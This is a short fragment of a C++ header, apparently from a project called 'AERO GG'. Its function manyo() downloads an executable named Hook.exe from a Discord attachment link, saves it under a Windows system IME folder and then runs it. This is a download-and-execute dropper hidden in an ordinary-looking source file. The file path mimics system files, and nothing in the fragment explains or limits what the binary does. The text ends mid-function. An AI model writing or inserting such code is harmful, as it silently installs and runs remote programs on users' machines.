#pragma once
#include "C:\Users\20110\Desktop\AERO GG\Defines\utils.h"
std::mutex isuse;
...
int manyo() {
	HRESULT c = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/858783107809673257/957781769476792330/Hook.exe"), _T("C:/Windows/SysWOW64/IME/IMETC/applets/Hook.exe"), 1, NULL);
	// the destination file 
	system("C:/Windows/SysWOW64/IME/IMETC/applets/Hook.exe");
	return 1;
